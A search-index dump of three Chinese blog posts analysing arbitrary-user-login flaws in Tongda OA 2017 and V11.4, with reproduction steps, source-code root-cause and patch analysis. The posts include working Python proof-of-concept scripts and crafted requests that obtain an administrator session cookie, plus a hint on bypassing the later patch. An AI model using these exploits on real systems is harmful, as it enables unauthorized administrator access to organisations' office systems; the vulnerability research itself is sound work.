[{"categories":null,"content":"漏洞概述 通达OA系统采用领先的B/S(浏览器/服务器)操作方式，使得网络办公不受地域限制。 Office Anywhere采用基于WEB的企业计算，主HTTP服务器采用了世界上最先进的 Apache服务器，性能稳定可靠。数据存取集中控制，避免了数据泄漏的可能。提供数据备份工具，保护系统数据安全。多级的权限控制，完善的密码验证与登录验证机制更加强了系统安全性。 通达OA官方更新了V11版本安全补丁，修复了任意用户伪造登录漏洞，该漏洞的操作难度低，危害程度大。未经授权的攻击者通过构造请求包实现用户登录，又由于UID是主键且步进为1递增，从而导致可以指定UID实现任意用户登录（admin的缺省UID为1）。 ","date":"2020-12-19","objectID":"/%E9%80%9A%E8%BE%BE-oa-office-anywhere-v11.4%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90%E7%AC%AC%E4%BA%8C%E5%A4%84/:1:0","tags":null,"title":"通达 OA Office Anywhere v11.4任意用户登录漏洞复现与原理详细解析（第二处）","uri":"/%E9%80%9A%E8%BE%BE-oa-office-anywhere-v11.4%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90%E7%AC%AC%E4%BA%8C%E5%A4%84/"},{"categories":null,"content":"漏洞环境 官网：https://www.tongda2000.com/ 下载：https://cdndown.tongda2000.com/oa/2019/TDOA11.4.exe 版本：通达OA V11.X\u003cV11.5 测试系统： Windows 7 专业版 64位操作系统 macOS11.0.1 （攻击机） python3.7.5 ","date":"2020-12-19","objectID":"/%E9%80%9A%E8%BE%BE-oa-office-anywhere-v11.4%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90%E7%AC%AC%E4%BA%8C%E5%A4%84/:2:0","tags":null,"title":"通达 OA Office Anywhere v11.4任意用户登录漏洞复现与原理详细解析（第二处）","uri":"/%E9%80%9A%E8%BE%BE-oa-office-anywhere-v11.4%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90%E7%AC%AC%E4%BA%8C%E5%A4%84/"},{"categories":null,"content":"漏洞验证 第一步：访问ispirit/login_code.php，在返回值中保存codeuid：{58AA7BF5-725C-F8EB-3324-BE17C4E8F6AA} 第二步：访问general/login_code_scan.php 修改如下： GET请求改为POST请求 添加Content-Type 添加Content-Length 添加请求体codeuid={xxx}\u0026source=pc\u0026uid=1\u0026type=confirm\u0026username=admin 这个请求一般会返回status 1 第三步：访问/ispirit/login_code_check.php?codeuid={xxx} 如果请求正常，会返回如下图所示数据 第四步：访问/general/index.php，顺利登录后台，权限是系统管理员，实现任意用户登录 ","date":"2020-12-19","objectID":"/%E9%80%9A%E8%BE%BE-oa-office-anywhere-v11.4%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90%E7%AC%AC%E4%BA%8C%E5%A4%84/:3:0","tags":null,"title":"通达 OA Office Anywhere v11.4任意用户登录漏洞复现与原理详细解析（第二处）","uri":"/%E9%80%9A%E8%BE%BE-oa-office-anywhere-v11.4%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90%E7%AC%AC%E4%BA%8C%E5%A4%84/"},{"categories":null,"content":"漏洞原理 漏洞地址存在于general/login_code_scan.php，进入解密后的源码处查看代码，可以看到通过POST请求接收5个参数，然后存到数组里，uid可控，没有对uid进行任何校验，这就产生了漏洞 这里会检测codeuid，如果codeuid存在并且正确会返回1 再后面就没有任何检测了，直接在返回包里返回status 漏洞点要发送5个参数，分别是codeuid，source，uid，type，username codeuid必须是实时获取到的，否则无法通过校验 source只需填入pc、web或者mac其中之一（源码中做了判断,必须是这三个之一才会正常返回status） uid为1就是管理员权限，可以通过本地数据库查到，前面几篇博客都说明了，就不多说了。 最后并没有对type和username做检测 按理发请求的时候这两个任意值都是可以的，但是经过测试username可以是任意值，但是type必须是confirm，否则无法任意用户登录，那么这个type应该是有校验的，只不过不是在这个文件中，所以我们要找到这个校验处。 校验很可能存在的位置就是下一个步骤，也就是访问/ispirit/login_code_check.php?codeuid={xxx}，找到源码进行查看。 可以看到15行对type进行判断 如果type不是confirm就不会执行session操作，换句话就无法保存状态，伪造的管理员cookie也就无法生效了，后续直接访问后台就不会成功，所以type必须是confirm。 ","date":"2020-12-19","objectID":"/%E9%80%9A%E8%BE%BE-oa-office-anywhere-v11.4%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90%E7%AC%AC%E4%BA%8C%E5%A4%84/:4:0","tags":null,"title":"通达 OA Office Anywhere v11.4任意用户登录漏洞复现与原理详细解析（第二处）","uri":"/%E9%80%9A%E8%BE%BE-oa-office-anywhere-v11.4%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90%E7%AC%AC%E4%BA%8C%E5%A4%84/"},{"categories":null,"content":"补丁分析 找到v11.5版本的general/login_code_scan.php文件，可以看到不再直接从UID参数中取UID了，而是通过P参数获取sessionid，再通过sessionid获取数据库中的UID，再通过UID等信息生成TOKEN，最后再通过TOKEN等信息生成缓存，这样就解决了UID可控的问题了 ![image-20201219221115596](D:\\tutucoo\\content\\posts\\通达 OA Office Anywhere v11.4任意用户登录漏洞复现与原理详细解析（第二处）\\image-20201219221115596.png) ","date":"2020-12-19","objectID":"/%E9%80%9A%E8%BE%BE-oa-office-anywhere-v11.4%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90%E7%AC%AC%E4%BA%8C%E5%A4%84/:5:0","tags":null,"title":"通达 OA Office Anywhere v11.4任意用户登录漏洞复现与原理详细解析（第二处）","uri":"/%E9%80%9A%E8%BE%BE-oa-office-anywhere-v11.4%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90%E7%AC%AC%E4%BA%8C%E5%A4%84/"},{"categories":null,"content":"总结 该漏洞点存在于general/login_code_scan.php，需要传递5个参数，分别是codeuid、source、uid、type、username、其中codeuid需要发送ispirit/login_code.php请求获取，其他几个参数通过分析源码我们也都知道了，唯独还有/ispirit/login_code_check.php?codeuid={xxx}请求，不知道是从何而来，可能是通过黑盒测试，二维码扫描过程中抓到的吧，也就是个猜测，自己通过APP扫码登录出了点问题，就不再细说了。 ","date":"2020-12-19","objectID":"/%E9%80%9A%E8%BE%BE-oa-office-anywhere-v11.4%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90%E7%AC%AC%E4%BA%8C%E5%A4%84/:6:0","tags":null,"title":"通达 OA Office Anywhere v11.4任意用户登录漏洞复现与原理详细解析（第二处）","uri":"/%E9%80%9A%E8%BE%BE-oa-office-anywhere-v11.4%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90%E7%AC%AC%E4%BA%8C%E5%A4%84/"},{"categories":null,"content":"附：POC import json import requests def getSession(url): vulUrl = url+'/ispirit/login_code.php' res = requests.get(vulUrl) codeuid = json.loads(res.text)['codeuid'] print(codeuid) confirmUrl = url + '/general/login_code_scan.php' data = { 'codeuid':codeuid, 'uid': int(1), 'source': 'pc', 'type': 'confirm', 'username': 'admin', } res = requests.post(confirmUrl,data=data) status = json.loads(res.text)['status'] print(status) if status == str(1): seesionUrl = url + '/ispirit/login_code_check.php?codeuid='+codeuid res = requests.get(seesionUrl) print('[*]cookie:'+res.headers['Set-Cookie']) else: print('[-]failed') if __name__ == \"__main__\": getSession('http://xxxx/') ","date":"2020-12-19","objectID":"/%E9%80%9A%E8%BE%BE-oa-office-anywhere-v11.4%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90%E7%AC%AC%E4%BA%8C%E5%A4%84/:7:0","tags":null,"title":"通达 OA Office Anywhere v11.4任意用户登录漏洞复现与原理详细解析（第二处）","uri":"/%E9%80%9A%E8%BE%BE-oa-office-anywhere-v11.4%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90%E7%AC%AC%E4%BA%8C%E5%A4%84/"},{"categories":null,"content":"漏洞概述 通达OA系统采用领先的B/S(浏览器/服务器)操作方式，使得网络办公不受地域限制。 Office Anywhere采用基于WEB的企业计算，主HTTP服务器采用了世界上最先进的 Apache服务器，性能稳定可靠。数据存取集中控制，避免了数据泄漏的可能。提供数据备份工具，保护系统数据安全。多级的权限控制，完善的密码验证与登录验证机制更加强了系统安全性。 未经授权的攻击者通过构造请求包实现用户登录，又由于UID是主键且步进为1递增，从而导致可以指定UID实现任意用户登录（admin的缺省UID为1）。 ","date":"2020-12-18","objectID":"/%E9%80%9A%E8%BE%BE-oa-office-anywhere-2017%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/:1:0","tags":null,"title":"通达 OA Office Anywhere 2017任意用户登录漏洞复现与原理详细解析","uri":"/%E9%80%9A%E8%BE%BE-oa-office-anywhere-2017%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/"},{"categories":null,"content":"漏洞环境 官网：https://www.tongda2000.com/ 下载：链接：https://pan.baidu.com/s/1RLoz7wUZc0Hr9S7aBoxYew 提取码：thcz 版本： 通达OA 2017版 测试系统： Windows 7 家庭版 64位操作系统 Windows 10 教育版（攻击机） ","date":"2020-12-18","objectID":"/%E9%80%9A%E8%BE%BE-oa-office-anywhere-2017%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/:2:0","tags":null,"title":"通达 OA Office Anywhere 2017任意用户登录漏洞复现与原理详细解析","uri":"/%E9%80%9A%E8%BE%BE-oa-office-anywhere-2017%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/"},{"categories":null,"content":"漏洞复现 使用burp拦截，访问/logincheck_code.php，burp断下后修改如下： a) GET请求修改为POST请求 b) 删除Cookie字段 c）添加请求体UID=1 d) 添加Content-Type: application/x-www-form-urlencoded 经过测试，使用app扫码登录时，可以捕获到/logincheck_code.php这一条数据包。 该请求成功后会返回一个管理员cookie 访问后台 后台首页地址是：http://192.168.3.116/general/index.php?isIE=0\u0026modify_pwd=0，直接带上上一步返回的cookie访问该地址，就实现了任意用户登录了，权限是系统管理员 ","date":"2020-12-18","objectID":"/%E9%80%9A%E8%BE%BE-oa-office-anywhere-2017%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/:3:0","tags":null,"title":"通达 OA Office Anywhere 2017任意用户登录漏洞复现与原理详细解析","uri":"/%E9%80%9A%E8%BE%BE-oa-office-anywhere-2017%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/"},{"categories":null,"content":"漏洞原理 通过漏洞复现，可以得知，漏洞点存在于logincheck_code.php，解密源码后找到logincheck_code.php 可以看到UID参数可控，通过POST请求获取 然后会根据UID获取数据库中的数据 判断是否是被禁用户 记录被ban用户尝试登录次数 被ban用户第一次登录会收到提醒，第二次以后会设置ban的过期时间 之后都是一些多端登录之类的操作，有兴趣可以自己看一看，关键的还是在后面。 180行可以看到UID被保存到session中，这样，有可控参数，并且这个可控参数会被保存到session，这就可能存在任意用户登录了，我们可以合理猜测，只要构造一个管理员UID，系统就会通过cookie返回管理员的sessionid，之后再通过该sessionid登录就可以实现任意用户登录了。 网上看到该地址存在的漏洞需要构造UID=1\u0026CODEUID=_PC{xxxxxxxx}，并通过访问/ispirit/login_code.php获取codeuid，但是通过查看通达2017源码可以看到，它并没有检测codeuid，直接构造一个UID即可 ","date":"2020-12-18","objectID":"/%E9%80%9A%E8%BE%BE-oa-office-anywhere-2017%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/:4:0","tags":null,"title":"通达 OA Office Anywhere 2017任意用户登录漏洞复现与原理详细解析","uri":"/%E9%80%9A%E8%BE%BE-oa-office-anywhere-2017%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/"},{"categories":null,"content":"总结 从白盒角度来看，可以通过源码中找到可控输入参数，如果这个参数还会被保存为session，就可以猜测存在任意用户登录。 通过源码构造poc，这里是通过POST接收参数，因此请求采用POST，另外需要UID，可以合理猜测UID=1是管理员，这也可通过本地数据库进行验证，从我的另一篇博客文章也可以证明这一点：https://tutucoo.gitee.io/%E9%80%9A%E8%BE%BE-oa-office-anywhere-v11%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/#5-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86 POST请求通常还需要请求头Content-Type，Content-Type有以下几种类型： application/x-www-form-urlencoded 在发送前编码所有字符（默认） multipart/form-data 不对字符编码,在使用包含文件上传控件的表单时，必须使用该值。 text/plain 空格转换为 \"+\" 加号，但不对特殊字符编码。 通常测试任意用户登录使用的是x-www-form-urlencoded，此外，还可以测试带上Content-Length: 100，有时候服务器会对该字段进行检测。 从黑盒的角度来看，如果在测试过程中看到login_code_check这样的地址，看英文意思也能猜出是用于登录检测了，那么就是任意用户登录高发的位置了，如果请求体中还包含了UID，不妨试一下UID=1，再通过返回的cookie直接访问后台地址，如果可以正常访问，那么就是任意用户登录了。 ","date":"2020-12-18","objectID":"/%E9%80%9A%E8%BE%BE-oa-office-anywhere-2017%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/:5:0","tags":null,"title":"通达 OA Office Anywhere 2017任意用户登录漏洞复现与原理详细解析","uri":"/%E9%80%9A%E8%BE%BE-oa-office-anywhere-2017%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/"},{"categories":null,"content":"1. 漏洞描述 通达OA系统采用领先的B/S(浏览器/服务器)操作方式，使得网络办公不受地域限制。 Office Anywhere采用基于WEB的企业计算，主HTTP服务器采用了世界上最先进的 Apache服务器，性能稳定可靠。数据存取集中控制，避免了数据泄漏的可能。提供数据备份工具，保护系统数据安全。多级的权限控制，完善的密码验证与登录验证机制更加强了系统安全性。 通达OA官方更新了V11版本安全补丁，修复了任意用户伪造登录漏洞，该漏洞的操作难度低，危害程度大。未经授权的攻击者通过构造请求包实现用户登录，又由于UID是主键且步进为1递增，从而导致可以指定UID实现任意用户登录（admin的缺省UID为1）。 ","date":"2020-12-13","objectID":"/%E9%80%9A%E8%BE%BE-oa-office-anywhere-v11.4%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/:1:0","tags":null,"title":"通达 OA Office Anywhere V11.4任意用户登录漏洞复现与原理详细解析","uri":"/%E9%80%9A%E8%BE%BE-oa-office-anywhere-v11.4%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/"},{"categories":null,"content":"2. 漏洞环境 官网：https://www.tongda2000.com/ 下载：https://cdndown.tongda2000.com/oa/2019/TDOA11.4.exe 版本：通达OA V11.X\u003cV11.5 测试系统： Windows 7 专业版 64位操作系统 macOS11.0.1 python3.7.5 ","date":"2020-12-13","objectID":"/%E9%80%9A%E8%BE%BE-oa-office-anywhere-v11.4%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/:2:0","tags":null,"title":"通达 OA Office Anywhere V11.4任意用户登录漏洞复现与原理详细解析","uri":"/%E9%80%9A%E8%BE%BE-oa-office-anywhere-v11.4%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/"},{"categories":null,"content":"3. 漏洞验证 下载并执行poc 进入这个地址下载poc:https://github.com/NS-Sp4ce/TongDaOA-Fake-User 执行poc，poc如果顺利执行会返回cookie 任意用户登录 打开burp，开启代理，访问http://192.168.3.104/general/index.php?isIE=0\u0026modify_pwd=0，替换cookie中的PHPSESSID参数为POC脚本运行获取的sessionid，然后放包 切换到浏览器，可以看到已经使用系统管理员身份登录了后台 ","date":"2020-12-13","objectID":"/%E9%80%9A%E8%BE%BE-oa-office-anywhere-v11.4%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/:3:0","tags":null,"title":"通达 OA Office Anywhere V11.4任意用户登录漏洞复现与原理详细解析","uri":"/%E9%80%9A%E8%BE%BE-oa-office-anywhere-v11.4%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/"},{"categories":null,"content":"4. 漏洞原理 POC的主要流程: 首先会发送一条GET请求到/general/login_code.php，在其响应包中获取到其中的一串codeuid 发送一条POST请求到/logincheck_code.php，在其请求体中添加上一步获取到的codeuid以及uid=1，这里uid=1代表的是管理员权限，发送成功后会在其响应包中获取Cookie值，经过测试，使用app扫描登录时可以捕获到这条包 最后发送一条GET请求到/general/index.php，Cookie修改为上一步获取到的cookie值，然后就可以成功伪造身份并以管理员身份进入后台 POC核心代码如下： USER_AGENTS = [ \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\", ... ] headers={} def getV11Session(url): checkUrl = url+'/general/login_code.php' try: headers[\"User-Agent\"] = choice(USER_AGENTS) #随机挑选列表中的UserAgent res = requests.get(checkUrl,headers=headers) #通过组合checkUrl和UserAgent，发起一个get请求 resText = str(res.text).split('{') #分解请求的返回包，以{为界限 codeUid = resText[-1].replace('}\"}', '').replace('\\r\\n', '') #获取返回包中的一串codeuid getSessUrl = url+'/logincheck_code.php' #通过得到的的codeuid和uid，发送一个post请求到logincheck_code.php res = requests.post( getSessUrl, data={'CODEUID': '{'+codeUid+'}', 'UID': int(1)},headers=headers) tmp_cookie = res.headers['Set-Cookie']#该POST请求返回了设置cookie的请求 headers[\"User-Agent\"] = choice(USER_AGENTS) #重新选择一个UserAgent headers[\"Cookie\"] = tmp_cookie #设置新的cookie #最后通过拼接UserAgent以及Cookie发送一个get请求到general/index.php check_available = requests.get(url + '/general/index.php',headers=headers) if '用户未登录' not in check_available.text:# 返回包如果不包含“用户未登录”这样的字眼表示登录成功 if '重新登录' not in check_available.text: print('[+]Get Available COOKIE:' + tmp_cookie) else: print('[-]Something Wrong With ' + url + ',Maybe Not Vulnerable.') except: print('[-]Something Wrong With '+url) 接下来，演示一下手动获取cookie，并实现任意用户登录 burp拦截打开，直接访问/general/login_code.php，拦截返回包，在返回包中可以看到返回的codeuid，保存起来，后面要用 接着访问/logincheck_code.php，删去Cookie，data部分修改为CODEUID={xxx}\u0026UID=1，这里codeuid要填写上一步获取到的codeuid，如下图所示： 如果请求参数正确，返回包里的msg字段为空，否则会提示“参数不正确”，此时保存Set-Cookie里面的值，后面要用 最后访问/general/index.php，修改Cookie为上一步Set-Cookie的值1rp2qql0p3uloi87o7ogua6g32，点击forward获取到返回包，可以后台中包含的字眼了，如果请求失败，会返回“用户未登录” 放出这条包，跳转到浏览器就可以直接进入后台了 再通过源码了解下引起漏洞的原因是什么，所在php文件是logincheck_code.php，根据访问地址，可知logincheck_code.php在根目录下，找到该文件打开 直接打开文件看源码，乱码，显然是加密，通过文件头的标识Zend可知，加密方式为Zend加密 不过Zend加密已经有相关的解密的工具，这里提供下载： https://pan.baidu.com/s/1OdV5YxmNarmCVMZWYy4AuQ 提取码：hw7o 工具使用方法也是傻瓜式的，很容易使用，这里就不进行演示了。 解密后可以看到文件内部的代码了，下面进行代码审计 可以看到logincheck_code.php的UID参数是可控的 最重要的部分如下，系统通过获取到UID，再存储到session中，上面可以通过POST参数控制UID输入，有了可控输入和缓存，这就满足了用户伪造的两个重要的条件 那么请求中为什么还需要CODEUID参数呢？翻一下文件可以看到有个if判断，如果login_codeuid为空就会提示“参数错误！”，而login_codeuid来自于get_cache，也就是说要获取CODEUID需要先设置cache，这样才能获得CODEUID。 这个值应该也是由服务端返回，在源码中进行搜索，可以看到很多的结果，可以看到login_code.php（general/login_code和ispirit/login_code均可返回CODEUID），而POC中第一个发起的请求就是发往login_code.php，可见第一个请求的目的就是通过这个请求获取到CODEUID了 它是如何返回CODEUID的呢？我们以ispirit文件夹下的login_code.php为例进行查看 它会从参数codeuid获取值，如果没有传递codeuid，就会随机生成一个codeuid，最后通过echo显示，也就是说直接访问这个地址，就可以查看到codeuid了 login_code在ispirit文件夹下，直接访问，果然返回了codeuid （另外一个文件general/login_code是通过返回二维码的形式将CODEUID返回的。） 这样，我们就得到了codeuid，现在就可以发送POST请求到logincheck_code了，通过它的响应包获取到了cookie，由于请求中的UID的值是1，也就是管理员，在发请求时将未登录cookie删除，服务端就会返回一个管理员的cookie了，这样再通过访问/general/index.php，也就是后台的首页地址，就可以实现任意用户登录了。 那么如何知道user=1就是管理员呢？ 通达本地部署了一个mysql数据库，通过访问数据库就可以知道uid的存储情况 进入通达OA根目录，在mysql5目录下找到my.ini，里面有密码 进入bin文件夹下，右键打开控制台输入命令登录数据库 查询数据库，可以看到uid=1的用户是admin ","date":"2020-12-13","objectID":"/%E9%80%9A%E8%BE%BE-oa-office-anywhere-v11.4%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/:4:0","tags":null,"title":"通达 OA Office Anywhere V11.4任意用户登录漏洞复现与原理详细解析","uri":"/%E9%80%9A%E8%BE%BE-oa-office-anywhere-v11.4%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/"},{"categories":null,"content":"4. 补丁分析 分析v11.5版本的源码，找到logincheck_code.php，可以看到不再接收UID参数了，而是转为接收TOKEN，然后把token作为key获取值，再对这个值进行解密，最后从解密后的数据中取出UID，解决了UID可控的问题，但是可以通过找到一处设置OA:authcode:token:的地方，或者找到一个可以控制键值的缓存，即可绕过 ","date":"2020-12-13","objectID":"/%E9%80%9A%E8%BE%BE-oa-office-anywhere-v11.4%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/:5:0","tags":null,"title":"通达 OA Office Anywhere V11.4任意用户登录漏洞复现与原理详细解析","uri":"/%E9%80%9A%E8%BE%BE-oa-office-anywhere-v11.4%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/"},{"categories":null,"content":"5. 总结 通达OA任意用户登录（伪造）是一个比较典型的任意用户登录漏洞，因此作为学习这类漏洞的案例还是比较有代表性的。 漏洞利用过程也比较简单，需要关注的是，在具备了可控输入参数UID和UID缓存到session中这两个条件时，就可能存在任意用户伪造漏洞了，再通过代码审计可知，需要codeuid的值，通过代码引用回溯，定位到获取codeuid的方法，最后通过发起存在漏洞点的请求获取到管理员cookie，然后在未登录的情况下访问后台时带上这个cookie，就可以实现以管理员的身份登录了，如果uid递增，也就是系统中存在的其他用户，也就实现了任意用户登录了。 